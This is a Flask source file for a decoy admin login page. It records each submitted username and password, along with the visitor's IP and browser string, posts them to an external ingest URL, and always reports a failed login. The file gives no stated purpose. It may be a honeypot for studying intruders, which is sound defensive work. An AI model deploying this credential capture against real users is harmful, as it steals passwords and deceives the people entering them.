from flask import Flask, render_template, request, jsonify
import requests 
from dotenv import load_dotenv
import os
 
load_dotenv()


app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def admin_panel():

    if request.method == "POST": 
        payload ={
            "username": request.form.get("username"),

            "password": request.form.get("password"),

            "ip": request.headers.get("X-Real-IP", request.remote_addr),
                                        

            "user_agent": request.headers.get("User-Agent"),
        }
        

        try:  

            response = requests.post(os.environ.get("INGEST_API_URL"), json=payload, timeout=5.0)

            response.raise_for_status()

            return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

        except requests.exceptions.Timeout:
        # Triggered if the server takes longer than 5.0 seconds to send data
            app.logger.error("Ingest API timed out.")
            return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

        except requests.exceptions.ConnectionError:
            # Triggered if the API is down, DNS fails, or network is disconnected
            app.logger.error("Failed to connect to Ingest API.")
            return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

        except requests.exceptions.HTTPError as err:
            # Triggered by raise_for_status() for 4xx and 5xx errors
            status_code = response.status_code
            app.logger.error(f"Ingest API returned HTTP error {status_code}: {err}")
            return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

        except requests.exceptions.RequestException as err:
            # Catch-all for any other requests-related issues (e.g., Invalid URL, Missing Schema)
            app.logger.error(f"An unexpected request error occurred: {err}")
            return render_template("admin_panel.html", error="Invalid username or password. Please try again.")

    else:
        return render_template("admin_panel.html")
    
